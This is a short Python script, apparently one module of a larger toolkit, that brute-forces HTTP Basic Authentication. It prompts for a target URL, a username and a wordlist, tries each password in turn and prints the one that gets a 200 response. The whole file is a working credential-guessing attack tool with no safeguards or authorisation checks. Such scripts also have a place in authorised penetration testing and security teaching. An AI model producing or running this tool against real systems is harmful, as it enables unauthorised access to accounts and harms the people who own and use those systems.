import requests
from requests.auth import HTTPBasicAuth

def run():
    url = input("Enter target URL (e.g., http://example.com/protected): ")
    username = input("Enter username: ")
    wordlist = input("Enter path to password wordlist: ")

    try:
        with open(wordlist, "r") as f:
            for password in f:
                password = password.strip()
                res = requests.get(url, auth=HTTPBasicAuth(username, password))
                if res.status_code == 200:
                    print(f"[+] Success! Password: {password}")
                    return
                print(f"[-] Failed: {password}")
    except FileNotFoundError:
        print("Wordlist file not found.")
